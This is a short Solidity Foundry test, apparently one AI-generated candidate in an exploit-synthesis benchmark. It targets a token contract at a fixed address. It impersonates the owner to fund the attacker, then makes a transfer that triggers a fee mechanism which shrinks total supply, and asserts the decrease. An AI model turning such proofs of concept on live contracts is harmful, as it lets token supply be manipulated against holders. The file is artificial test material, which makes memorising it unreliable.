// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// Ensemble synthesis candidate.
// Selected source model: Gemini.
// Reviewed candidate models: Gemini, Qwen, Deepseek.

import "forge-std/Test.sol";

interface MANU {
    function totalSupply() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    // --- State Variables ─────────────────────────────────────
    address constant TARGET = 0x16bE19fB70F902EcF39b54aD988eE427cB1b6848;
    address attacker = address(this);
    MANU internal manu;

    // --- Setup ───────────────────────────────────────────────
    function setUp() public {
        manu = MANU(TARGET);
        // The owner of the contract has a 'buy' history from the constructor.
        address owner = manu.owner();

        // Impersonate the owner to transfer tokens to the attacker.
        // This is necessary to create a 'buy' history for the attacker,
        // which is required to pass a check in the `_transfer` function.
        vm.startPrank(owner);
        manu.transfer(attacker, 1_000_000 * 1e18);
        vm.stopPrank();
    }

    // --- Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 preTotalSupply = manu.totalSupply();
        uint256 transferAmount = 100_000 * 1e18;

        // This transfer will trigger the fee mechanism which reduces the total supply.
        // The oracle will check if the total supply has decreased after this call.
        manu.transfer(address(0xdead), transferAmount);

        uint256 postTotalSupply = manu.totalSupply();
        assertLt(postTotalSupply, preTotalSupply, "Logic Exploit Failed");
    }

    // --- Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

